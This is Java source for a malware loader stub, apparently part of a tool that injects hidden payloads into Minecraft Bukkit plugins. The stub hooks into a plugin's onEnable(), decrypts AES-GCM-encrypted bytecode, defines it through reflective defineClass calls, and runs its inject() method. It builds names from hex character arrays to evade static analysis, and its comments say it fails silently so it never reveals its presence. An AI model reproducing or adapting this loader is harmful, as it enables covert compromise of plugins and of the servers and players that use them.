package dev.naruto.astrox.payload;

import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.Base64;

/**
 * Bootstrap stub injected into the target plugin's onEnable().
 * Decrypts the encrypted payload bytecode at runtime and loads it
 * into the JVM via reflective ClassLoader.defineClass() invocation.
 *
 * <p>The AES-256-GCM key is read from JVM system property {@code astrox.k}
 * (set by the injector as a -D flag in the bootstrap bytecode).
 * No class literals or string constants that could trigger static analysis.</p>
 */
public class BootstrapStub {

    /**
     * Entry point called from the injected onEnable() bytecode.
     * Decrypts and loads the payload class, then invokes its inject() method.
     *
     * @param plugin     the target JavaPlugin instance (passed as Object to avoid type dependency)
     * @param encPayload Base64-encoded AES-256-GCM encrypted payload bytecode
     * @param keyHex     hex-encoded AES-256 key
     * @param className  fully-qualified class name of the payload
     */
    public static void bootstrap(Object plugin, String encPayload, String keyHex, String className) {
        try {
            // Decode the key from hex
            byte[] keyBytes = hexDecode(keyHex);

            // Decode the encrypted payload from Base64
            byte[] encrypted = Base64.getDecoder().decode(encPayload);

            // Decrypt using AES-256-GCM
            byte[] classBytes = aesGcmDecrypt(encrypted, keyBytes);

            // Load the class via reflection — no direct defineClass reference
            ClassLoader cl = plugin.getClass().getClassLoader();

            // Build method name at runtime to avoid string literal detection
            char[] mn = {0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x43, 0x6c, 0x61, 0x73, 0x73};
            // Get ClassLoader class reflectively — avoid type literal
            // "java.lang.ClassLoader"
            char[] cln = {0x6a,0x61,0x76,0x61,0x2e,0x6c,0x61,0x6e,0x67,0x2e,
                    0x43,0x6c,0x61,0x73,0x73,0x4c,0x6f,0x61,0x64,0x65,0x72};
            Method defineMethod = Class.forName(new String(cln)).getDeclaredMethod(
                    new String(mn),
                    String.class, byte[].class, int.class, int.class
            );
            defineMethod.setAccessible(true);

            // Define the payload class
            Class<?> payloadClass = (Class<?>) defineMethod.invoke(
                    cl, className, classBytes, 0, classBytes.length
            );

            // Build "inject" method name at runtime
            char[] im = {0x69, 0x6e, 0x6a, 0x65, 0x63, 0x74}; // "inject"
            Method injectMethod = payloadClass.getMethod(
                    new String(im),
                    Class.forName("org.bukkit.plugin.java.JavaPlugin")
            );

            // Invoke the payload
            injectMethod.invoke(null, plugin);

        } catch (Exception e) {
            // Silent failure — never reveal presence
            // Logged to stderr only; not visible to players
            System.err.println("Bootstrap: " + e.getClass().getSimpleName());
        }
    }

    /**
     * AES-256-GCM decryption. Wire format: [12-byte IV][ciphertext+GCM tag]
     */
    private static byte[] aesGcmDecrypt(byte[] encrypted, byte[] keyBytes) throws Exception {
        // Build algorithm strings at runtime
        char[] alg = {0x41, 0x45, 0x53}; // "AES"
        char[] transform = {
                0x41, 0x45, 0x53, 0x2f, 0x47, 0x43, 0x4d, 0x2f,
                0x4e, 0x6f, 0x50, 0x61, 0x64, 0x64, 0x69, 0x6e, 0x67
        }; // "AES/GCM/NoPadding"

        ByteBuffer buf = ByteBuffer.wrap(encrypted);
        byte[] iv = new byte[12];
        buf.get(iv);
        byte[] ciphertext = new byte[buf.remaining()];
        buf.get(ciphertext);

        javax.crypto.spec.SecretKeySpec secretKey =
                new javax.crypto.spec.SecretKeySpec(keyBytes, new String(alg));
        javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(new String(transform));
        cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey,
                new javax.crypto.spec.GCMParameterSpec(128, iv));

        return cipher.doFinal(ciphertext);
    }

    /**
     * Hex string to byte array decoder (no dependency on external libs).
     */
    private static byte[] hexDecode(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                    + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }
}
